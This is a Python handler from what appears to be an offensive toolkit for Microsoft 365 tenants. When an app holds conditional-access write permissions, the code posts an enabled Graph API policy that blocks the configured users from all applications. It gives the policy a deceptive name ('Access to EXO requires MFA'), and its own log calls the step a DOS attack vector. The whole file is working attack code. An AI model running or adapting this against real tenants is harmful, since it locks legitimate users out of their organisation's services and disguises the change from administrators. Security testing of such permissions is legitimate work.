from typing import List
from attacks.handlers.base_handler import AttackHandler, Request, Response
from utils import logger
import requests

logger = logger.createLogger('attacks.handlers.conditional_access_handler')


class ConditionalAccess_Handler(AttackHandler):
    def handle(self, request: Request,responses:List[Response]):
        # TODO map request.roles to fit with this attack
        if ("Policy.ReadWrite.ConditionalAccess" in request.roles) and ("Application.Read.All" in request.roles) and ("Policy.Read.All" in request.roles):
            status = False
            attack_name = "ConditionalAccessRWVectors"
            message = ""
            error = "ConditionalAccessRWVectors - failed"
            conf = request.attack_config['conditional_access']
            
            logger.debug("Policy.ReadWrite.ConditionalAccess - Allows the app to read and write your organization's conditional access policies on behalf of the signed-in user.")
            logger.debug("Application.Read.All - Allows the app to read all applications and service principals without a signed-in user.")
            logger.debug("Policy.Read.All - Allows the app to read all your organization's policies without a signed in user.")

            logger.debug("Attack vector - DOS.")         
            try:
                create_message_URL = "https://graph.microsoft.com/v1.0/identity/conditionalAccess/policies"
                message_obj = {
                    "displayName": "Access to EXO requires MFA",
                    "state": "enabled",
                    "conditions": {
                        "clientAppTypes": [
                            "all"
                        ],
                        "applications": {
                            "includeApplications": [
                                "All"
                            ]
                        },
                        "users": {
                            "includeUsers": [conf["users"]]
                        }
                    },
                    "grantControls": {
                        "operator": "AND",
                        "builtInControls": [
                            "block"
                        ]
                    }
                }
                result = requests.post(create_message_URL, json=message_obj, headers=request.request_headers)
                if result.status_code == 201:
                    print(result.json)
                    message += "Added block on: %s \n" % (conf["users"])
                    status = True
                if message == "":
                    message = error
            except:
                logger.error("Unexpected exception in ConditionalAccess_Handler function")
            responses.append(Response(attack_name,request.tenantId,request.appId,status,message))
        return super().handle(request,responses)
